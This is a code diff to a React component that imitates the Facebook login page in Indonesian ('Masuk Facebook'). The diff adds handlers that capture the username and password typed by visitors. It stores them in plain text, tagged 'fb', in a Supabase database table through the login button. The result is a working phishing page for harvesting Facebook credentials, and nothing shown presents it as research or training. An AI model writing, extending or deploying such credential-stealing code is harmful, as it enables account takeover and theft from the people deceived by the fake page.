@@ -5,6 +5,28 @@ import InstagramLogo from "./assets/ig-logo.png";
 function LoginFacebook() {
   document.title = "Masuk Facebook";
 
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+
+  const handleLogin = async () => {
+    // Perform any validation or checks you need before inserting data into the database
+    try {
+      const { data, error } = await supabase
+        .from("test")
+        .insert([{ username: username, psw: password, acc: "fb" }])
+        .select();
+
+      // Handle success or error here
+      if (error) {
+        console.error("Error inserting data:", error);
+      } else {
+        console.log("Data inserted successfully:", data);
+      }
+    } catch (error) {
+      console.error("Error:", error);
+    }
+  };
+
   return (
     <div className="bg-[#ECEFF5] min-h-screen flex flex-col items-center gap-10">
       <div className="bg-[#3B5998] py-4 flex justify-center items-center w-full">
@@ -20,15 +42,20 @@ function LoginFacebook() {
             <input
               type="email"
               placeholder="Nomor ponsel atau email"
+              onChange={(e) => setUsername(e.target.value)}
               className="p-3 text-sm outline-none rounded-t-md"
             />
             <input
               type="email"
               placeholder="Kata Sandi Facebook"
+              onChange={(e) => setPassword(e.target.value)}
               className="p-3 text-sm outline-none rounded-b-md border-t"
             />
           </div>
-          <button className="font-bold text-white bg-[#1877F2] py-2.5 rounded-md">
+          <button
+            className="font-bold text-white bg-[#1877F2] py-2.5 rounded-md"
+            onClick={handleLogin}
+          >
             Masuk
           </button>
         </form>
